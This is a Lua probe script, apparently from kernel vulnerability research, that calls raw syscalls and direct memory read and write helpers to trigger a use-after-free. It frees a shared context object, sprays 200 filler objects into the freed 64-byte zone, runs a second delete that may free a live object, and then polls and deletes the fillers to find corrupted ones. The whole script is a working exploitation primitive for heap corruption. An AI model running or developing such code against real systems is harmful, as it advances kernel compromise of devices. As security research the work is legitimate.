-- CRASH_CLASS: HIGH
-- PROBE 508a: after a shared-context object is torn down, 200 filler objects are
-- created (their D/T/C allocations all land in the 64-byte zone), then the second
-- item's delete runs.  The teardown treats whatever occupies the freed context's
-- address as a context: if a filler's T landed there, [T+0x10] is that filler's S
-- and the release frees a live object.  This probe then polls and deletes every
-- filler to look for a damaged one.

print("=== PROBE 508a: filler health after the second delete ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local sc_c, sc_p, sc_d = make_syscall(669), make_syscall(664), make_syscall(662)
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end
    return -1
end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
local function fill(a, v, n) for o = 0, (n or 64) - 4, 4 do wr(a + o, v) end end

local DATA = memory.alloc(0x100)
local DESC = memory.alloc(0x200)
local OUT  = memory.alloc(0x80)
local IDS  = memory.alloc(0x100)
local RES  = memory.alloc(0x400)
fill(DATA, 0)
fill(DESC, 0x44444444, 0x100)
wr(DESC + 0x10, 0); wr(DESC + 0x14, 0); wr(DESC + 0x18, 0); wr(DESC + 0x1C, 0)

local K = 200
local fillers = {}

-- target object, two items sharing one context
wr(OUT, 0)
local okc, retc = pcall(function() return sc_c(0x1001, DATA, 2, 1, OUT) end)
local base = rd(OUT)
print(string.format("A create count=2 ret=%d base=%d", to_num(retc), base))
if base == 0 then print("=== DONE ===") return end
local ids = { base, base + 0x10000 }
for i = 1, 2 do
    wr(IDS, ids[i]); fill(RES, 0x77777777, 8)
    pcall(function() return sc_p(IDS, 1, RES) end)
end

wr(IDS, ids[1]); fill(RES, 0x77777777, 8)
local ok0, r0 = pcall(function() return sc_d(IDS, 1, RES) end)
print(string.format("B delete item0 ret=%d st=%08x", to_num(r0), rd(RES)))

for k = 1, K do
    wr(OUT, 0)
    local ok, r = pcall(function() return sc_c(1, DESC, 1, 1, OUT) end)
    local id = rd(OUT)
    if ok and to_num(r) == 0 and id ~= 0 then fillers[k] = id
    else print(string.format("  filler %d failed ret=%d", k, to_num(r))); break end
end
print(string.format("C fillers=%d", #fillers))

wr(IDS, ids[2]); fill(RES, 0x77777777, 8)
local ok1, r1 = pcall(function() return sc_d(IDS, 1, RES) end)
print(string.format("D delete item1 ret=%d st=%08x", to_num(r1), rd(RES)))

local ok3, other, dead = 0, 0, 0
for k, id in ipairs(fillers) do
    wr(IDS, id); fill(RES, 0x77777777, 8)
    local ok, r = pcall(function() return sc_p(IDS, 1, RES) end)
    local st = rd(RES)
    if ok and to_num(r) == 0 and st == 3 then ok3 = ok3 + 1
    else
        other = other + 1
        if other <= 8 then print(string.format("  filler %d id=%d poll ret=%d st=%08x", k, id, to_num(r), st)) end
    end
end
print(string.format("E polled ok=%d other=%d", ok3, other))

local dclean, dbad = 0, 0
for k, id in ipairs(fillers) do
    wr(IDS, id); fill(RES, 0x77777777, 8)
    local ok, r = pcall(function() return sc_d(IDS, 1, RES) end)
    if ok and to_num(r) == 0 and rd(RES) == 0 then dclean = dclean + 1
    else
        dbad = dbad + 1
        if dbad <= 8 then print(string.format("  filler %d id=%d delete ret=%d st=%08x", k, id, to_num(r), rd(RES))) end
    end
end
print(string.format("F deletes clean=%d bad=%d", dclean, dbad))
print("=== DONE ===")
